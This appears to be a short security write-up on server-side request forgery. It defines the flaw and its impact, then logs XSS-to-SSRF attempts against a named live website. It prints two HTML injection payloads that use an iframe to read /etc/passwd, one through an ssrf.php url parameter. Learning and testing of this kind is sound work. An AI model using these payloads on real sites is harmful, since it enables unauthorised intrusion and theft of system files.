# What is SSRF ?
Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to an unintended location.

In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials.

![image](https://user-images.githubusercontent.com/85927038/200545058-50086fa7-d053-4970-8278-c5d144337c06.png)

# Impact of SSRF (Server side request forgery )
A successful SSRF attack can often result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other back-end systems that the application can communicate with. In some situations, the SSRF vulnerability might allow an attacker to perform arbitrary command execution.

An SSRF exploit that causes connections to external third-party systems might result in malicious onward attacks that appear to originate from the organization hosting the vulnerable application.

# techniques tried on the website for SSRF 
## 1. SSRF from XSS
   * In this method we use XSS to perform SSRF 
   * Firstly we navigate to https://magnus.jalatechnologies.com/Home/Popup 
   * And Click on the Prompt box 
   * And Paste this code on it  ```html
    <img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/> ```
   * we will be redirected to a page
   ![image](https://user-images.githubusercontent.com/85927038/200546716-80bd05df-c325-4581-91a4-07b55b80b111.png)
   * we found out that we are not allowed to fetch local resources
   ![image](https://user-images.githubusercontent.com/85927038/200547321-9906142a-6916-47ac-9323-9e4cb77c2309.png)
   (*) WE WILL TRY DIFFERRNT PAYLOAD TO FIND ANYTHING INTERESTING !

   (*) Payload used
   ```html
 <img src="echopwn" onerror="document.write('<iframe src=ssrf.php?url=file:///etc/passwd></iframe>')"/> 
```
   ![image](https://user-images.githubusercontent.com/85927038/200548457-514ed849-3bf7-493e-9b04-5b442976a578.png)

